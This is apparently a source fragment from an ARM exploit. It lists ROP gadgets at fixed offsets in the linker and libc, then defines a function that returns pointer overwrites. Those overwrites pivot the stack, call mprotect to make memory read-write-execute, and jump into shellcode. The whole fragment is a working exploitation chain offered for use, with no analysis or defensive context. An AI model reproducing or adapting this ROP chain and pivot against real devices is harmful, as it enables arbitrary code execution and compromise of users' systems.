// [Linker Gadgets] -------------------------------------------------------------

NOP = 0xb00036e0 + 1; // bx lr

STR_R2_R0 = 0xb0003728 + 1; // str r2, [r0] ; bx lr
STR_R2_R3 = 0xb0005700 + 1; // str r2, [r3] ; bx lr

SP_PLUS_0xC = 0xb0005cb4 + 1; // add sp, //0xc ; bx lr
SP_PLUS_0x8 = 0xb00056c8 + 1; // add sp, //8 ; bx lr

// Some POPs

POP_PC        = 0xb0005d1e + 1; // pop {pc}
POP_R0__R4_PC = 0xb00038b2 + 1; // pop {r0, r1, r2, r3, r4, pc}
POP_R0__R6_PC = 0xb00058fc + 1; // pop {r0, r1, r2, r3, r4, r5, r6, pc}
POP_R1__R5_PC = 0xb00057b6 + 1; // pop {r1, r2, r3, r4, r5, pc}
POP_R2__R6_PC = 0xb000584e + 1; // pop {r2, r3, r4, r5, r6, pc}
POP_R4_PC     = 0xb000377a + 1; // pop {r4, pc}
POP_R4_R5_PC  = 0xb000652c + 1; // pop {r4, r5, pc}
POP_R4__R6_PC = 0xb00037fa + 1; // pop {r4, r5, r6, pc}
POP_R4__R7_PC = 0xb000516c + 1; // pop {r4, r5, r6, r7, pc}

function relocate_stage2(base, libc_base) {

// [Libc Gadgets] ---------------------------------------------------------------

STACK_PIVOT    = libc_base + 0x0001b77a;     // LDMDB R4, {R0,R4-R10,R12-PC}

POP_R2_R3      = libc_base + 0x0000f3e8;     // pop {r2, r3} ; bx lr
STR_R3_R0_0X14 = libc_base + 0x000112e0;     // str r3, [r0, #0x14] ; mov r0, #0 ; bx lr
STR_R0_R3      = libc_base + 0x0002a564 + 1; // str r0, [r3] ; bx lr
MOV_R0_R3      = libc_base + 0x00011318;     // mov r0, r3 ; bx lr

// [Libc Functions] -------------------------------------------------------------

MPROTECT = libc_base + 0x0000c5f8;

return [
    [base + 0x0278, STR_R3_R0_0X14],  // 000019F8 .text:sub_59DC18BC+10 BLX R7 LR=59DC18CF
    [base + 0x0258, NOP],             // 000019F8 .text:sub_59DC18BC+10 BLX R7 LR=59DC18CF    
    [base + 0x0270, STR_R0_R3],       // 000019F8 .text:sub_59DC18BC+2A BLX R1 LR=59DC18E9
    [base + 0x0250, POP_R2_R3],       // 000019F8 .text:sub_59DC18BC+3A BLX R3 LR=59DC18F9 
    
    // The previous initialization phase generates this layout:
    // at base + 0x0008: ARENA address
    // at ARENA + 0x14: An address on the stack [specifically, SP + 0x98]

    [base + 0x027c, STACK_PIVOT],
    [base + 0x030c, NOP],
    [base + 0x025c, NOP],
    [base + 0x0274, NOP],
    [base + 0x0254, NOP],
    [base + 0x0218, NOP],

    // --------------------------- [ ROP CHAIN ] --------------------------------
    
    // Stack: base + 0x0500

    [base + 0x0500, POP_R0__R4_PC],
    [base + 0x0504, base + 0x0000], // R0
    [base + 0x0508, 0x1000],        // R1
    [base + 0x050c, 0x7],           // R2 PROT_READ|PROT_WRITE|PROT_EXEC
    [base + 0x0510, base],          // R3 - for continuation of execution
    [base + 0x0514, 0xdeadbeef],    // R4 - don't care
    [base + 0x0518, MPROTECT],      // PC

    [base + 0x051c, base + 0x0600],  // Run 32 bit shellcode

    // --------------------------- [ Shellcode ] --------------------------------

    // Shellcode: base + 0x0600

    [base + 0x0600, SHELLCODE],

];

}